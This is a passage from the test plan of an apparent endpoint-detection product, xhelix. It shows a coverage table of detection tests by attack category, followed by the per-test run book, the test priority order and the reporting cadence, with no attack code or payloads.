| Persistence (PS-*)      | 20 | 0 | 0 | 20 | PS-13, PS-19 known gaps |
| Cred theft (C-*)        | 16 | 0 | 0 | 16 | C-11, C-12, C-13, C-15 gaps |
| Reverse shell (RS-*)    | 15 | 1 | 0 | 14 | RS-11/12/13 gaps |
| Exfil (E-*)             | 10 | 0 | 0 | 10 | E-05, E-10 gaps |
| Container escape (CE-*) | 14 | 0 | 0 | 14 | CE-02, CE-07, CE-09, CE-11 gaps |
| Public-app exploit (EX-*) | 15 | 1 | 0 | 14 | — |
| SSRF (SS-*)             | 8  | 0 | 0 | 8  | SS-07 gap |
| Defense evasion (D-*)   | 15 | 0 | 0 | 15 | D-04, D-07 gaps |
| Auth (AU-*)             | 25 | 0 | 0 | 25 | AU-16, AU-17, AU-19, AU-20, AU-24 gaps |
| Deception (DE-*)        | 16 | 0 | 0 | 16 | DE-14 (tc) pending wiring |
| Response TP (R-*)       | 18 | 0 | 0 | 18 | — |
| Response FP (FP-*)      | 17 | 2 | 0 | 15 | partial post-PS.23 |
| Soak gate (SG-*)        | 3  | 0 | 0 | 3  | — |
| PanicSwitch (PS-*)      | 3  | 0 | 0 | 3  | — |
| Evidence chain (EV-*)   | 8  | 0 | 0 | 8  | — |
| Hot/cold store (ST-*)   | 5  | 0 | 0 | 5  | ST-05 stub |
| Performance (PF-*)      | 5  | 0 | 0 | 5  | — |
| Real malware (MW-*)     | 8  | 0 | 0 | 8  | sandbox required |
| **TOTAL**               | **256** | **5** | **0** | **251** | |

(The "5 pass" are observations from Phase 1 — see `PHASE_1_RESULTS.md`.)

---

## 13. Run book per test

For every test row:

1. Pre-conditions: xhelix running, sensors verified, monitor mode confirmed.
2. Mark log boundary: `echo "===<TEST-ID>_BEGIN_$(date -u +%FT%TZ)===" >> /var/log/xhelix/xhelix.out`
3. Execute the variant.
4. Wait 5 seconds for correlator.
5. Mark log end.
6. Collect: alerts in window, rule names, planner-shadow scores,
   forensic-IOC entries, evidence snapshot dir name.
7. Compute detection latency = first-alert.time - test-begin-marker.time.
8. Update this file's table row: status + evidence_id + latency + notes.
9. If `Fail`: add to `DETECTION_GAPS.md` with one of:
   - missing-signal (sensor didn't see it)
   - missed-rule (signal there, rule didn't match)
   - no-cooccur (signals there, scorer didn't reach threshold)
   - missed-action (alert fired, response engine didn't act)
   - false-positive (alert on benign workload)

## 14. Priority order

If we can only run a subset, the order is:

1. **§6.2 FP corpus** — non-negotiable before enforce mode anywhere.
2. **§3.1 + §3.2 + §3.5** — memory + proc + reverse-shell, the core path.
3. **§3.3 + §3.4** — persistence + credentials.
4. **§4 Auth** — high operator value.
5. **§5 Deception** — validates Ring 2 isn't fictional.
6. **§3.7 Container escape** — required for cloud-native deploys.
7. **§3.6 Exfil** + **§3.10 Evasion**.
8. **§10 Real malware** — gold standard, requires §1.2 sandbox.

## 15. Reporting cadence

- Daily during active testing: append the day's deltas to a new section
  `## Run Log` (date-stamped).
- End of each MITRE-tactic complete: write a one-page summary into
  `DETECTION_GAPS.md` under that tactic.
- End of phase: produce `PHASE_2_RESULTS.md` matching the structure of
  `PHASE_1_RESULTS.md`.
